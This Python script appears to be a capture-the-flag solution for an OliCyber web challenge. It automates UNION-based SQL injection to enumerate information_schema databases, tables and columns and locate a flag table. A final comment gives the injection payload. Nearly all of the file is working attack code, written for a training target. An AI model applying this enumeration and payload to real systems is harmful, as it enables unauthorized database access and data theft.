from myunion import UnionSistem
import requests
#@@group_concat_max_len=1048576
url="http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php"
s=requests.Session()
U=UnionSistem(url,s)
numer=1
listOfInfoSchemaColumns = ["CATALOG_NAME","SCHEMA_NAME","DEFAULT_CHARACTER_SET_NAME",
                               "DEFAULT_COLLATION_NAME","SQL_PATH"]
df=U.informationSchema_InformationExtraction(info="SCHEMATA",listOfInfoSchemaColumns=listOfInfoSchemaColumns,numer=1)
print(df)
system_dbs = {"mysql", "information_schema", "performance_schema", "sys"}

# Supponiamo di avere gi√† il DataFrame df con SCHEMATA
# df = informationSchema_InformationExtraction(info="SCHEMATA", listOfInfoSchemaColumns=[...])

# DataFrame dei database di sistema
df_system = df[df['SCHEMA_NAME'].isin(system_dbs)].reset_index(drop=True)

# DataFrame dei database applicativi
df_application = df[~df['SCHEMA_NAME'].isin(system_dbs)].reset_index(drop=True)
print(df_application)
print("-----")
print(df_system)
print("-----")

l2=["TABLE_NAME", "ENGINE", "VERSION", "ROW_FORMAT", "TABLE_ROWS", "AVG_ROW_LENGTH",
    "DATA_LENGTH", "MAX_DATA_LENGTH", "INDEX_LENGTH", "DATA_FREE", "AUTO_INCREMENT",
    "CREATE_TIME", "UPDATE_TIME", "CHECK_TIME", "TABLE_COLLATION", "CHECKSUM",
    "CREATE_OPTIONS", "TABLE_COMMENT"]
map_of_dfs = {}
for index, row in df_application.iterrows():
    
   map_of_dfs[row['SCHEMA_NAME']]=U.informationSchema_InformationExtraction(info="TABLES",listOfInfoSchemaColumns=l2,numer=numer,where=f"TABLE_SCHEMA='{row['SCHEMA_NAME']}'")
#print(map_of_dfs)
map_columns = {}
for db_name, df_tables in map_of_dfs.items():
    print(f"Database: {db_name}")
    print(df_tables)
    print("-----")
print(map_of_dfs)
l3=["COLUMN_NAME", "ORDINAL_POSITION", "COLUMN_DEFAULT", "IS_NULLABLE"]
k=U.informationSchema_InformationExtraction(info="COLUMNS",listOfInfoSchemaColumns=l3,numer=numer,where="TABLE_NAME='here_is_the_flag' AND TABLE_SCHEMA='challdb'")
print(k)
#{"ID": "1 AND 1=0 UNION SELECT flag FROM here_is_the_flag -- "} injection finale
